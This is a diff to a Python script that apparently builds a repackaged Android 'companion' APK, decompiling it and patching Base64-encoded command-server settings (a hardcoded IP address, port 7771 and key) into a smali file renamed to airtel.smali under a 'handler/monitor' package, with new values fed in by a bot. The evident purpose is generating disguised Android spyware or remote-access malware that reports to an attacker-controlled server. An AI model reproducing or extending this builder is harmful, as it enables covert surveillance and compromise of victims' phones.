@@ -777,22 +777,24 @@ def step_decompile():
     print("  ✅ Decompile done")
 
 
-# ── Default Base64 values for companion server config (love.smali) ───────────
-# These are the original values baked into the companion APK.
-# When the bot passes new values via env vars, they replace these defaults.
-_DEFAULT_HOST_B64 = "NjQuODkuMTYxLjE4OA"   # 64.89.161.188
-_DEFAULT_PORT_B64 = "Nzc3MQ"                 # 7771
+# ── Default Base64 values for companion server config (airtel.smali) ─────────
+# Exact strings as they appear inside airtel.smali (with == padding).
+# STEP_5B runs AFTER decompile (STEP_5) but BEFORE package rename (STEP_6),
+# so OLD_PKG path is always valid here: companion_decompiled/smali/<old_path>/airtel.smali
+_DEFAULT_HOST_B64 = "NjQuODkuMTYxLjE4OA=="  # 64.89.161.188
+_DEFAULT_PORT_B64 = "Nzc3MQ=="               # 7771
 _DEFAULT_KEY_B64  = "VHhUeFQ="               # TxTxT
 
 
 def step_patch_server_config():
-    """Patch companion server config (IP/port/key) in love.smali.
+    """Patch companion server config (IP/port/key) in airtel.smali.
 
+    Targets airtel.smali specifically — path is built dynamically from OLD_PKG
+    (always com/handler/monitor at STEP_5B time, before STEP_6 rename runs).
     Reads Base64-encoded values from env vars SERVER_HOST_B64,
-    SERVER_PORT_B64, SERVER_KEY_B64. If any is set, replaces the
-    corresponding default value in love.smali via string replacement.
+    SERVER_PORT_B64, SERVER_KEY_B64. Replaces exact default strings in-file.
     """
-    print("\n── Step 5b: Patch companion server config (love.smali)")
+    print("\n── Step 5b: Patch companion server config (airtel.smali)")
 
     new_host = os.environ.get("SERVER_HOST_B64", "").strip()
     new_port = os.environ.get("SERVER_PORT_B64", "").strip()
@@ -802,26 +804,51 @@ def step_patch_server_config():
         print("  ℹ️  No server config overrides — keeping defaults")
         return
 
-    smali_dir = "companion_decompiled/smali"
-    patched   = 0
+    # Build path dynamically from OLD_PKG — valid before STEP_6 rename
+    old_path     = OLD_PKG.replace(".", "/")
+    airtel_smali = os.path.join("companion_decompiled", "smali", old_path, "airtel.smali")
+
+    if not os.path.isfile(airtel_smali):
+        print(f"  ❌ airtel.smali not found at: {airtel_smali}")
+        print("  ⚠️  Skipping server config patch")
+        return
+
+    print(f"  🎯 Target: {airtel_smali}")
+
+    with open(airtel_smali, "r", encoding="utf-8") as f:
+        content = f.read()
+
+    original = content
+    patched  = 0
 
     if new_host and new_host != _DEFAULT_HOST_B64:
-        n = _py_sed(smali_dir, _DEFAULT_HOST_B64, new_host)
-        print(f"  {'✅' if n else '⚠️'} Host: {_DEFAULT_HOST_B64} → {new_host}  ({n} file(s))")
-        patched += n
+        if _DEFAULT_HOST_B64 in content:
+            content = content.replace(_DEFAULT_HOST_B64, new_host)
+            print(f"  ✅ Host: {_DEFAULT_HOST_B64} → {new_host}")
+            patched += 1
+        else:
+            print(f"  ⚠️  Host default not found in airtel.smali — no replacement")
 
     if new_port and new_port != _DEFAULT_PORT_B64:
-        n = _py_sed(smali_dir, _DEFAULT_PORT_B64, new_port)
-        print(f"  {'✅' if n else '⚠️'} Port: {_DEFAULT_PORT_B64} → {new_port}  ({n} file(s))")
-        patched += n
+        if _DEFAULT_PORT_B64 in content:
+            content = content.replace(_DEFAULT_PORT_B64, new_port)
+            print(f"  ✅ Port: {_DEFAULT_PORT_B64} → {new_port}")
+            patched += 1
+        else:
+            print(f"  ⚠️  Port default not found in airtel.smali — no replacement")
 
     if new_key and new_key != _DEFAULT_KEY_B64:
-        n = _py_sed(smali_dir, _DEFAULT_KEY_B64, new_key)
-        print(f"  {'✅' if n else '⚠️'} Key:  {_DEFAULT_KEY_B64} → {new_key}  ({n} file(s))")
-        patched += n
+        if _DEFAULT_KEY_B64 in content:
+            content = content.replace(_DEFAULT_KEY_B64, new_key)
+            print(f"  ✅ Key:  {_DEFAULT_KEY_B64} → {new_key}")
+            patched += 1
+        else:
+            print(f"  ⚠️  Key default not found in airtel.smali — no replacement")
 
     if patched:
-        print(f"  ✅ Server config patched ({patched} replacement(s))")
+        with open(airtel_smali, "w", encoding="utf-8") as f:
+            f.write(content)
+        print(f"  ✅ airtel.smali written ({patched} replacement(s))")
     else:
         print("  ⚠️  No replacements made — values may already match")
 
